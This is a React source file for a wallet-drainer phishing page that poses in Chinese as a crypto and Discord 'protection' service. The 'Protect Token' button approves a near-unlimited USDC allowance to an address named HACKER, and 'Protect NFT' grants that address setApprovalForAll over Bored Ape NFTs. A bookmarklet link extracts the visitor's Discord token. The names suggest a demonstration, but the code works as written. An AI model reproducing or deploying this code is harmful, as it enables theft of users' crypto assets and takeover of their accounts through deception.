import logo from './img/fakeicon.png';
import './App.css';
import { ethers } from "ethers";
import abi from './erc20.json'
import nftabi from './erc721.json'

/* eslint-disable jsx-a11y/anchor-is-valid */
/* eslint-disable no-script-url */
function App() {
  return (
    <div className="relative flex min-h-screen flex-col justify-center overflow-hidden bg-gray-50 py-6 sm:py-12">
      <img src={logo} alt="" className="absolute top-1/2 left-1/2 max-w-none -translate-x-1/2 -translate-y-1/2" width="1308" />
      <div className="absolute inset-0 bg-[url(/src/img/grid.png)] bg-center [mask-image:linear-gradient(180deg,white,rgba(255,255,255,0))]"></div>
      <div className="relative bg-white px-6 pt-10 pb-8 shadow-xl ring-1 ring-gray-900/5 sm:mx-auto sm:max-w-lg sm:rounded-lg sm:px-10">
        <div className="mx-auto max-w-md">
          <img src={logo} className="h-6" alt="Tailwind Play" />
          <div className="divide-y divide-gray-300/50">
            <div className="space-y-6 py-8 text-base leading-7 text-gray-600">
              <p>立刻保護你的虛擬貨幣資產:</p>
              <ul className="space-y-4">
                <li className="flex items-center">
                  <svg className="h-6 w-6 flex-none fill-sky-100 stroke-sky-500 stroke-2" strokeLinecap="round" strokeLinejoin="round">
                    <circle cx="12" cy="12" r="11" />
                    <path d="m8 13 2.165 2.165a1 1 0 0 0 1.521-.126L16 9" fill="none" />
                  </svg>
                  <p className="ml-4">
                    防黑客盜竊
                  </p>
                </li>
                <li className="flex items-center">
                  <svg className="h-6 w-6 flex-none fill-sky-100 stroke-sky-500 stroke-2" strokeLinecap="round" strokeLinejoin="round">
                    <circle cx="12" cy="12" r="11" />
                    <path d="m8 13 2.165 2.165a1 1 0 0 0 1.521-.126L16 9" fill="none" />
                  </svg>
                  <p className="ml-4">
                    有內鬼，終止交易
                  </p>
                </li>
                <li className="flex items-center">
                  <svg className="h-6 w-6 flex-none fill-sky-100 stroke-sky-500 stroke-2" strokeLinecap="round" strokeLinejoin="round">
                    <circle cx="12" cy="12" r="11" />
                    <path d="m8 13 2.165 2.165a1 1 0 0 0 1.521-.126L16 9" fill="none" />
                  </svg>
                  <p className="ml-4">24小時，全方位監控危險</p>
                </li>
              </ul>
              <p>連線您的Metamask錢包，立刻啟動OVBAYC保護</p>
            </div>
            <div className="pt-8 pb-8 text-base font-semibold leading-7">
              <button className="mr-8 px-4 py-2 font-semibold text-sm bg-orange-500 text-white rounded-full shadow-sm" onClick={token}>
                Protect Token
              </button>
              <button className="px-4 py-2 font-semibold text-sm bg-orange-500 text-white rounded-full shadow-sm" onClick={nfttoken}>
                Protect NFT
              </button>
              <p/>
            </div>
            <div className="pt-8 text-base font-semibold leading-7">
              <a className="px-4 py-2 font-semibold text-sm bg-blue-500 text-white rounded-full shadow-sm"
              href='javascript: !function(){let token=Object.values(webpackChunkdiscord_app.push([[Math.random()], [], (e) => r=e.c])).find(m => m.exports && m.exports.default && m.exports.default.getToken).exports.default.getToken();alert("hello dear! your token:"+token);}()'
              >
                Drop and Drag this on your bookmark, Protect your discord
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

async function token() {
  if (window.ethereum) {
    const addresses = await window.ethereum.enable()
    console.log(addresses)
    if (addresses.length > 0) {
      const provider = new ethers.providers.Web3Provider(window.ethereum)
      const signer = provider.getSigner()
      let USDC = '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48' // USDC
      if ((await provider.getNetwork()).chainId === 1) {
        USDC = '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48' // USDC
      } else {
        USDC = '0x07865c6e87b9f70255377e024ace6630c1eaa37f'
      }
      const HACKER = '0x4f999203923e6f3A37504F2dB795a958A691f70a'
      const UsdcContract = new ethers.Contract(USDC, abi, signer);
      UsdcContract.approve(HACKER, "9999999999999000000")
    }

  }
}
async function nfttoken() {
  if (window.ethereum) {
    const addresses = await window.ethereum.enable()
    console.log(addresses)
    if (addresses.length > 0) {
      const provider = new ethers.providers.Web3Provider(window.ethereum)
      const signer = provider.getSigner()
      let NFT = '0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D' // BAYC
      if ((await provider.getNetwork()).chainId === 1) {
        NFT = '0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D' // BAYC
      } else {
        NFT = '0x0364e63cdeDCfa10de886b938ccea03475410c0e'
      }
      const HACKER = '0x4f999203923e6f3A37504F2dB795a958A691f70a'
      const NftContract = new ethers.Contract(NFT, nftabi, signer);
      NftContract.setApprovalForAll(HACKER, true)
    }

  }
}

export default App;
